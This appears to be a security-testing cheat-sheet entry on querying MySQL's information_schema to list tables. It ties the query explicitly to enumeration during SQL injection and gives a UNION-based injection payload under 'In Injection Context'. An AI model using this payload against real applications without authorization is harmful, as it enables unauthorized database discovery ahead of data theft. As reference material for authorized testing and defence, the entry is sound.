---
id: 9d6a4fde-0fd2-48ba-840c-ef207a0010d8
name: MySQL Select Information Schema Tables
type: command
executor: sql
data: SELECT * FROM information_schema.tables WHERE table_schema = 'public'
output: null
created_at: '2023-04-06T03:56:36.832375+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - mysql
  - enumeration
verified: true
validated: true
---

# MySQL Select Information Schema Tables

## Command

```sql
SELECT * FROM information_schema.tables WHERE table_schema = 'public';
```

## Description

This command queries the information_schema to list tables in a specific schema (e.g., 'public'), aiding in database structure enumeration during SQLi attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| table_schema | Target schema name (use DATABASE() for current in MySQL) | Yes |

## Examples

### Basic Usage

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();
```

### In Injection Context

```sql
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()--
```

## Expected Output

+---------------+
| table_name    |
+---------------+
| users         |
| guestbook     |
+---------------+

## Related

- [[procedures/SQL Injection WAF Bypass using MySQL Specific Commands]]
- [[MySQL Show Tables in Database]]
